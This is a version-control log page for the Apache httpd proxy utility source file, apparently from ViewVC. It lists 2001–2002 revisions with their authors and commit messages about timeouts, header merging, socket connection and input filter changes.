Diff to [previous 95993](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95993&r2=96055)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95993&r2=96055&diff_format=h))
```

  Timeout/time fixes

```

---

Revision [**95993**](/viewvc?view=revision&revision=95993) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95993&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95993&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=95993))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=95993)

Modified
*Wed Jul 10 06:01:14 2002 UTC*
(22 years, 6 months ago)
by *orlikowski*

File length: 36332 byte(s)

Diff to [previous 95854](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95854&r2=95993)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95854&r2=95993&diff_format=h))
```
Continue the Bill Rowe apr_size_t crusade.

```

---

Revision [**95854**](/viewvc?view=revision&revision=95854) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95854&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95854&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=95854))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=95854)

Modified
*Sun Jun 23 06:06:25 2002 UTC*
(22 years, 7 months ago)
by *wrowe*

File length: 36328 byte(s)

Diff to [previous 95674](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95674&r2=95854)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95674&r2=95854&diff_format=h))
```

  No crutches, people!

```

---

Revision [**95674**](/viewvc?view=revision&revision=95674) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95674&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95674&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=95674))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=95674)

Modified
*Fri Jun 14 17:14:57 2002 UTC*
(22 years, 7 months ago)
by *wrowe*

File length: 36321 byte(s)

Diff to [previous 95623](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95623&r2=95674)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95623&r2=95674&diff_format=h))
```

  Cleanup proxy timeouts a bit to remove emits and make consistent to
  vhost timeout.

```

---

Revision [**95623**](/viewvc?view=revision&revision=95623) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95623&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95623&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=95623))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=95623)

Modified
*Wed Jun 12 23:59:31 2002 UTC*
(22 years, 7 months ago)
by *wrowe*

File length: 36311 byte(s)

Diff to [previous 95150](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95150&r2=95623)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=95150&r2=95623&diff_format=h))
```

  Solve the 80/20 by initializing and storing server_rec->timeout and
  server_rec->keep_alive_timeout in apr_time_interval_t format (in apr
  units, whatever they be), as both values exist to pass into APR, and
  all APR timeouts are in apr_time_t.

Reviewed by:	Cliff Woolley

```

---

Revision [**95150**](/viewvc?view=revision&revision=95150) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95150&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=95150&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=95150))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=95150)

Modified
*Fri May 17 11:24:17 2002 UTC*
(22 years, 8 months ago)
by *trawick*

File length: 36421 byte(s)

Diff to [previous 94808](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94808&r2=95150)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94808&r2=95150&diff_format=h))
```
stop using APLOG_NOERRNO in calls to ap_log_[pr]error()

```

---

Revision [**94808**](/viewvc?view=revision&revision=94808) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94808&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94808&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=94808))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=94808)

Modified
*Thu Apr 25 22:12:51 2002 UTC*
(22 years, 9 months ago)
by *trawick*

File length: 36805 byte(s)

Diff to [previous 94501](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94501&r2=94808)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94501&r2=94808&diff_format=h))
```
get mod_proxy to build on EBCDIC machines

```

---

Revision [**94501**](/viewvc?view=revision&revision=94501) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94501&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94501&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=94501))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=94501)

Modified
*Sat Apr 6 12:43:47 2002 UTC*
(22 years, 9 months ago)
by *minfrin*

File length: 36177 byte(s)

Diff to [previous 94383](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94383&r2=94501)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94383&r2=94501&diff_format=h))
```
Quick fix to an incorrect comment.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**94383**](/viewvc?view=revision&revision=94383) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94383&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94383&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=94383))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=94383)

Modified
*Tue Apr 2 04:30:49 2002 UTC*
(22 years, 10 months ago)
by *dougm*

File length: 36156 byte(s)

Diff to [previous 94142](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94142&r2=94383)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94142&r2=94383&diff_format=h))
```
PR:
Obtained from:
Submitted by:
Reviewed by:	Ryan Bloom
remove call to ap_proxy_reset_output_filters() and the function itself.
this call breaks ssl proxy when the client is using keepalives.
this function is also no longer needed with recent-ish filter changes.

```

---

Revision [**94142**](/viewvc?view=revision&revision=94142) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94142&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94142&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=94142))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=94142)

Modified
*Fri Mar 22 21:41:14 2002 UTC*
(22 years, 10 months ago)
by *trawick*

File length: 36661 byte(s)

Diff to [previous 94083](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94083&r2=94142)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=94083&r2=94142&diff_format=h))
```
fix some abuse of apr_port_t (flagged by Sun WorkShop)

```

---

Revision [**94083**](/viewvc?view=revision&revision=94083) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94083&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=94083&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=94083))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=94083)

Modified
*Thu Mar 21 12:05:45 2002 UTC*
(22 years, 10 months ago)
by *minfrin*

File length: 36619 byte(s)

Diff to [previous 93918](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93918&r2=94083)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93918&r2=94083&diff_format=h))
```
Change the header merging behaviour in proxy, as some headers
(like Set-Cookie) cannot be unmerged due to stray commas in
dates.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**93918**](/viewvc?view=revision&revision=93918) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93918&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93918&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93918))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93918)

Modified
*Wed Mar 13 20:48:07 2002 UTC*
(22 years, 10 months ago)
by *fielding*

File length: 36521 byte(s)

Diff to [previous 93787](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93787&r2=93918)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93787&r2=93918&diff_format=h))
```
Update our copyright for this year.

```

---

Revision [**93787**](/viewvc?view=revision&revision=93787) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93787&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93787&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93787))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93787)

Modified
*Fri Mar 8 02:03:47 2002 UTC*
(22 years, 10 months ago)
by *trawick*

File length: 36521 byte(s)

Diff to [previous 93752](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93752&r2=93787)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93752&r2=93787&diff_format=h))
```
implement a common function for getting a socket and trying to connect
to the target host; use that common function for proxy HTTP and proxy
CONNECT

In that new function, fix this problem:

     Proxy HTTP and CONNECT: Keep trying other addresses from the DNS
     when we can't get a socket in the specified address family.  We may
     have gotten back an IPv6 address first and yet our system is not
     configured to allow IPv6 sockets.

An example host is www.ipv6.org.  The first address I get back is
an IPv6 address, but my machine may not be configured to allow an
AF_INET6 socket.

Before the fix: The apr_socket() failure was fatal.
After the fix:  When apr_socket() fails, we go to the next address from
                the resolver, successfully create a socket in the
                specified family (AF_INET), and all is well.

(an unrelated fix in this commit was to pass a server_rec in a broken
ap_log_error() call)

```

---

Revision [**93752**](/viewvc?view=revision&revision=93752) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93752&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93752&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93752))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93752)

Modified
*Thu Mar 7 06:07:25 2002 UTC*
(22 years, 10 months ago)
by *rbb*

File length: 33467 byte(s)

Diff to [previous 93529](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93529&r2=93752)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93529&r2=93752&diff_format=h))
```
We need to setup protocol filters for the fake request.  If we don't,
then when any request filters are added, the connection filters will be
lost.  This fixes the proxy.

```

---

Revision [**93529**](/viewvc?view=revision&revision=93529) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93529&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93529&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93529))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93529)

Modified
*Thu Feb 21 11:42:03 2002 UTC*
(22 years, 11 months ago)
by *trawick*

File length: 33366 byte(s)

Diff to [previous 93527](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93527&r2=93529)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93527&r2=93529&diff_format=h))
```
fix the linkage of and add a prototype for ap_proxy_table_unmerge()

```

---

Revision [**93527**](/viewvc?view=revision&revision=93527) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93527&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93527&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93527))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93527)

Modified
*Thu Feb 21 06:06:31 2002 UTC*
(22 years, 11 months ago)
by *minfrin*

File length: 33351 byte(s)

Diff to [previous 93093](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93093&r2=93527)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93093&r2=93527&diff_format=h))
```
Some browsers ignore cookies that have been merged into a
single Set-Cookie header. Set-Cookie and Set-Cookie2 headers
are now unmerged in the http proxy before being sent to the
client.
Fix a problem with proxy where each entry of a duplicated
header such as Set-Cookie would overwrite and obliterate the
previous value of the header, resulting in multiple header
values (like cookies) going missing.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**93093**](/viewvc?view=revision&revision=93093) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93093&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93093&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93093))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93093)

Modified
*Wed Jan 30 04:34:11 2002 UTC*
(23 years ago)
by *stoddard*

File length: 32572 byte(s)

Diff to [previous 93014](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93014&r2=93093)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=93014&r2=93093&diff_format=h))
```
Cleanup some fallout from the recent install_transport_filters commit.
Deprecate ap_proxy_pre_http_connection.

```

---

Revision [**93014**](/viewvc?view=revision&revision=93014) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93014&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=93014&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=93014))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=93014)

Modified
*Fri Jan 25 01:11:47 2002 UTC*
(23 years ago)
by *jerenkrantz*

File length: 32752 byte(s)

Diff to [previous 92928](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92928&r2=93014)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92928&r2=93014&diff_format=h))
```
Change ap_get_brigade prototype to remove *readbytes in favor of readbytes.
If you need the length, you should be using apr_brigade_length.  This is
much more consistent.  Of all the places that call ap_get_brigade, only
one (ap_http_filter) needs the length.  This makes it now possible to
pass constants down without assigning them to a temporary variable first.

Also:
- Change proxy_ftp to use EXHAUSTIVE mode (didn't catch its -1 before)
- Fix buglet in mod_ssl that would cause it to return too much data in
  some circumstances

```

---

Revision [**92928**](/viewvc?view=revision&revision=92928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=92928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=92928)

Modified
*Sat Jan 19 07:45:18 2002 UTC*
(23 years ago)
by *jerenkrantz*

File length: 32799 byte(s)

Diff to [previous 92722](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92722&r2=92928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92722&r2=92928&diff_format=h))
```
Input filtering prototype change: Socket blocking type should be
separate from the input filter mode type.

We also no longer look at readbytes to determine the method of
filter operation.  This makes the use of filters more obvious and
allows a wider range of options for input filters modes.

To start with, the new input filter modes are:

AP_MODE_READBYTES (no more than *readbytes returned)
AP_MODE_GETLINE (old *readbytes == 0 case)
AP_MODE_EATCRLF (old AP_MODE_PEEK)
AP_MODE_SPECULATIVE (will be used in a future ap_getline rewrite)
AP_MODE_EXHAUSTIVE (old *readbytes == -1 case)
AP_MODE_INIT (special case for NNTP over SSL)

The block parameter is an apr_read_type_e: APR_BLOCK_READ, APR_NONBLOCK_READ

This also allows cleanup of mod_ssl's handling in the getline case.

Reviewed by:	Ryan Bloom (concept), Greg Stein (concept)

```

---

Revision [**92722**](/viewvc?view=revision&revision=92722) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92722&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92722&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=92722))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=92722)

Modified
*Thu Jan 3 19:20:54 2002 UTC*
(23 years ago)
by *stoddard*

File length: 32737 byte(s)

Diff to [previous 92704](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92704&r2=92722)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92704&r2=92722&diff_format=h))
```
Fix seg fault in HTTP_IN when trying to handle the LimitRequestBody
directive when reading a proxy response. We should bypass LimitRequestBody
activities when handling a response from the proxied server.

I don't think this will circumvent requestbody checking on a large request
coming into the server that is destined to be proxied. (not tested though).

```

---

Revision [**92704**](/viewvc?view=revision&revision=92704) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92704&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92704&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=92704))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=92704)

Modified
*Wed Jan 2 19:12:40 2002 UTC*
(23 years ago)
by *stoddard*

File length: 32705 byte(s)

Diff to [previous 92690](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92690&r2=92704)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92690&r2=92704&diff_format=h))
```
Change the return code from APR_TIMEUP to APR_ECONNABORTED, which seems
to be a bit more descriptive. Move the check to inside the inner while()
loop and add an additional check for eos. If we get an EOS bucket, there
is no point in going further. Hopefully this will fix the last seg fault
in the function.

```

---

Revision [**92690**](/viewvc?view=revision&revision=92690) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92690&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92690&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=92690))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=92690)

Modified
*Mon Dec 31 20:43:59 2001 UTC*
(23 years, 1 month ago)
by *stoddard*

File length: 32676 byte(s)

Diff to [previous 92651](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92651&r2=92690)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92651&r2=92690&diff_format=h))
```
Eliminate loop in ap_proxy_string_read(). Need to be able to handle
getting an empty brigade from ap_get_brigade(). Also made sure that
we always call ap_get_brigade() in readline mode.

Submitted/Reviewed by: Adam Sussman & Bill Stoddard

```

---

Revision [**92651**](/viewvc?view=revision&revision=92651) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92651&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92651&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=92651))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=92651)

Modified
*Sat Dec 29 20:32:52 2001 UTC*
(23 years, 1 month ago)
by *stoddard*

File length: 32135 byte(s)

Diff to [previous 92226](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92226&r2=92651)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=92226&r2=92651&diff_format=h))
```
Detabify some functions. No functional change.

```

---

Revision [**92226**](/viewvc?view=revision&revision=92226) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92226&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=92226&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=92226))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=92226)

Modified
*Wed Nov 28 21:07:32 2001 UTC*
(23 years, 2 months ago)
by *ianh*

File length: 31408 byte(s)

Diff to [previous 91489](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91489&r2=92226)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91489&r2=92226&diff_format=h))
```
make the proxy code spit out an error to the error log.
This bit me when I included a 11th file no error message, nothing.

```

---

Revision [**91489**](/viewvc?view=revision&revision=91489) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91489&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91489&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=91489))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=91489)

Modified
*Tue Oct 16 14:45:56 2001 UTC*
(23 years, 3 months ago)
by *wrowe*

File length: 31297 byte(s)

Diff to [previous 91486](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91486&r2=91489)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91486&r2=91489&diff_format=h))
```

  Hmmm... mismatched namespaces :-?

```

---

Revision [**91486**](/viewvc?view=revision&revision=91486) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91486&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91486&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=91486))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=91486)

Modified
*Tue Oct 16 05:18:39 2001 UTC*
(23 years, 3 months ago)
by *rbb*

File length: 31294 byte(s)

Diff to [previous 91370](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91370&r2=91486)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91370&r2=91486&diff_format=h))
```
Cleanup the proxy code that creates a request to the origin
server.  This change adds an optional hook, which allows modules
to gain control while the request is created if the proxy module
is loaded.  The purpose of this hook is to allow modules to add
input and/or output filters to the request to the origin.  While
I was at it, I made the core use this hook, so that proxy request
creation uses some of the code from the core.  This can still be
greatly improved, but this is a good start.

```

---

Revision [**91370**](/viewvc?view=revision&revision=91370) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91370&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91370&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=91370))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=91370)

Modified
*Mon Oct 8 21:49:17 2001 UTC*
(23 years, 3 months ago)
by *ianh*

File length: 31340 byte(s)

Diff to [previous 91363](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91363&r2=91370)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=91363&r2=91370&diff_format=h))
```
dechunking filter removed.
add HTTP_IN filter after the headers have been parsed.
so that the HTTP_IN can check them ;-)
Still not 100% if this works properly, but I don't get
the chunking numbers displayed on my browser,
so it's better than what was there.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**91363**](/viewvc?view=revision&revision=91363) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91363&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=91363&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=91363))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=91363)

Modified
*Mon Oct 8 19:25:35 2001 UTC*
(23 years, 3 months ago)
by *ianh*

File length: 31427 byte(s)

Diff to [previous 90011](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=90011&r2=91363)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=90011&r2=91363&diff_format=h))
```
initial port of new Request-mode HTTP_IN filter to proxy.
Status: It serves a reverse-proxy page.. but SLOWLY.
VERY SLOWLY.
still looking at why, but now it serves pages instead of dumping core.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**90011**](/viewvc?view=revision&revision=90011) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=90011&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=90011&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=90011))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=90011)

Modified
*Tue Aug 7 21:18:03 2001 UTC*
(23 years, 5 months ago)
by *ianh*

File length: 31201 byte(s)

Diff to [previous 89855](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89855&r2=90011)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89855&r2=90011&diff_format=h))
```
change the parameter to ap_get_brigade from apr_site_t to apr_off_t, due to
a parameter change in the original filter.
PR:
Submitted by: barbee@veribox.net
Reviewed by: ianh@apache.org

```

---

Revision [**89855**](/viewvc?view=revision&revision=89855) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89855&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89855&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89855))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89855)

Modified
*Wed Aug 1 05:50:29 2001 UTC*
(23 years, 6 months ago)
by *orlikowski*

File length: 31202 byte(s)

Diff to [previous 89838](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89838&r2=89855)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89838&r2=89855&diff_format=h))
```
inet_addr and inet_network are not interchangable.
Furthermore, use apr_inet_addr, rather than ap_inet_addr (though they map
to the same thing).

```

---

Revision [**89838**](/viewvc?view=revision&revision=89838) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89838&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89838&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89838))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89838)

Modified
*Tue Jul 31 19:19:34 2001 UTC*
(23 years, 6 months ago)
by *orlikowski*

File length: 31365 byte(s)

Diff to [previous 89837](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89837&r2=89838)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89837&r2=89838&diff_format=h))
```
After checking what this does with Bill Rowe, and discovering it to be dead
wood, I am tossing it.

```

---

Revision [**89837**](/viewvc?view=revision&revision=89837) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89837&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89837&view=co))
